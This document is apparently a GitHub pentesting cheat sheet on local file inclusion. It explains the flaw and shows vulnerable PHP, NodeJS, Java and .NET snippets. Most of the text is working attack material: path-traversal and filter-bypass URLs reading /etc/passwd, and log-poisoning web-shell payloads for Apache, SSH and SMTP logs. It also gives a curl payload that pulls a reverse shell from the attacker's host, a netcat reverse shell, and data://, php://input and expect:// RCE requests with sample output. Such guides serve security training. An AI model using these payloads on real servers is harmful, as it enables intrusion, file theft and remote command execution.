# Local File Inclusion/lfi
## @Author : M3tr1c_r00t

![image](https://user-images.githubusercontent.com/99975622/211413582-dd96e035-6a45-477a-8d87-9868762c999b.png)


<li>
  <ul>An lfi is a web vulnerability which allows one to be able to view the servers files or even include other files within the root folder of the web server.
  </ul>
  <ul>An lfi can lead to information disclosure, cross-site scripting(XSS) and even rce(remote code execution).
  </ul>
  <ul>
  An lfi can occur when a server has been poorly configured or no proper sanitization practices are being observed.
  </ul>
  <ul>
  Lfi's usually occur when an application uses a path to a file as input.
  </ul>
  <ul>
  The server treats the input as trusted and is then executed.
  </ul>
  <ul>
  Other lfi's gives attackers the abilities to upload files into the server.
  </ul>
</li>

For example;
```
https://example-site.com/?module=contact.php
```
As an attacker, we can change the module part, as it being used as a path to the contact.php and try to view the internal files...

```
https://example-site.com/?module=/etc/passwd
```
### LFI Attacks

#### We can test for lfi vulnerable code by using "../" a couple of times
```
https://example-site.com/?module=../../../../etc/passwd
```
The code example for this can be
```
<?php
$file = $_GET['file'];

 include('directory/' . $file)

?>  
```

##### Or

```
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>
```   
### Or
The include() function loads a local or a remote file as we load a page. If the path passed to the include() is taken from a user-controlled parameter, like a GET parameter, and the code does not explicitly filter and sanitize the user input, then the code becomes vulnerable.
Many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them. Such functions include include_once(), require(), require_once(), file_get_contents(), and several others as well.


```   
   if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
##### This vuln can be fixed with the below code tho its still vulnerable...

```
<?php

if(isset($_GET['file']))
{
        $file=str_replace('../','',$_GET['file']);
        $file=str_replace('./','',$file);
        echo @file_get_contents('./'.$file);
}

?>
    
```

#### bypass of: $_GET['param']."php"
In some servers, they add a definite file extension to prevent exploitation....
<br>
We can exploit this by adding a null byte in url encoding:
<br>
This only applies to php version 5.3.4 and below...
```
http://example.com/index.php?page=../../../etc/passwd%00 // Only applies to PHP 5.3.4 and below
```
Another method...
```
http://example.com/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

To generate the './' many times;
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```
<br>

#### In other cases, we can use url encoding...
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```
#### If that doesn't work, try double url encoding...
```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
#### Accessing a local server...
```
http://example.com/index.php?page=http://IP:PORT/file.php
http://example.com/index.php?page=http://IP:PORT/file // dont put extension if there's  the php extension added in the code...
```

### Exploiting the LFI...
After you've already gotten your lfi, some keep files you can look out for include:

```
/var/log/apache2/access.log // if the server is apache
/var/log/auth.log //for ssh log poisoning
/var/log/mail.log //for smtp log poisonig

```
#### for Apache log poisoning...
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 

 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 



Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id

OR

python -m SimpleHTTPServer 9000 



Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 


file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php
```

#### SSh log poisoning
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 



Payload: ssh <?php system($_GET['c']);?>@<target_ip>


Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id
```
#### SMTP log poisoning
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 



telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id
```


#### Extras
Here are some php rce code that you can use in a suited situation....
```
<?php system($_GET['c']); ?>
<?php system($_REQUEST['c']$); ?>

<?php
$os = shell_exec('id');
echo "<pre>$os</pre>";
?>

<?php
$os = shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
?>

// Replace IP & Port

Dangerous PHP Functions that can be abused for RCE
<?php
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

### PHP Filters
php://filter allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.

The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.
```
http://144.126.226.105:30561/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

php://filter can also be used without base64 encoding the output using:
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```
#### Fuzzing for php files...
```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

## RCE
### PHP wrappers
PHP wrappers are additional codes which tell the stream how to handle specific protocols/encodings...
A wrapper is an entity that surrounds another entity (in this case – code). The wrapper can contain functionality added to the original code. PHP uses built-in wrappers, which are implemented alongside file system functions. Attackers use this native functionality of PHP to add vulnerabilities into wrappers.
```
PHP Expect Wrapper
PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default.
php?page=expect://ls
```
#### Reading the php config files...
PHP configuration files are found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version.
We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.

We should also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking.

#### Data Wrapper
If the "allow_url_include" is set to on, we can get rce using the data php wrapper.

The data wrapper can be used to include external data, including PHP code. 

```
MetricCode@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

After encoding the php code, we can execute it as follows. Add the base64 encoded code after the data wrapper 'data://text/plain;base64,' and the end add '&cmd="Your_Command" to execute code.'
```
http://example.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
##### Input PHP wrapper
For input wrapper, we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting.

we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter.
```
MetricCode@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://example.com/index.php?language=php://input&cmd=id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)
##### Except PHP Wrapper
It allows us to directly run commands through URL streams.
However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:
```
MetricCode@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
We can get RCE by ;
```
MetricCode@htb[/htb]$ curl -s "http://example.com/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### NodeJS
Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter language is used to control what data is written to a page:
```
Code: javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
As we can see, whatever parameter passed from the URL gets used by the readfile function, which then writes the file content in the HTTP response. Another example is the render() function in the Express.js framework. The following example shows uses the language parameter to determine which directory it should pull the about.html page from:
```
Code: js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
Unlike our earlier examples where GET parameters were specified after a (?) character in the URL, the above example takes the parameter from the URL path (e.g. /about/en or /about/es). As the parameter is directly used within the render() function to specify the rendered file, we can change the URL to show a different file instead.

### Java
The same concept applies to many other web servers. The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the include function:
```
Code: jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```
The include function may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS. The import function may also be used to render a local file or a URL, such as the following example:
```
Code: jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

###.NET
Finally, let's take an example of how File Inclusion vulnerabilities may occur in .NET web applications. The Response.WriteFile function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:
```
Code: cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
Furthermore, the @Html.Partial() function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:
```
Code: cs
@Html.Partial(HttpContext.Request.Query['language'])
```
Finally, the include function may be used to render local files or remote URLs, and may also execute the specified files as well:
```
Code: cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

### Filename Prefix
In case of a file name prefix, 
```
http://example.com?page=/../../../../../etc/passwd
```




### Functions Abilities
![image](https://user-images.githubusercontent.com/99975622/213332756-0910f78d-6acb-40a9-b8c3-eb062c7f7ee6.png)

### Bypassing Filters
To avoid path trasversals...
```
$language = str_replace('../', '', $_GET['language']);
```
We can use " ....//" and after filtering the remaining code is ../

We may use ..././ or ....\/ 

Url Encode
Double Url Encode...
#### Approved Paths...
```
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
In this example, files will only be called from the .languages directory. To bypass this;
```
http://example.com/index.php?language=./languages/../../../../etc/passwd
```




#### sources
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://highon.coffee/blog/lfi-cheat-sheet/
https://brightsec.com/blog/local-file-inclusion-lfi/
```
## NB
Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows. 

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
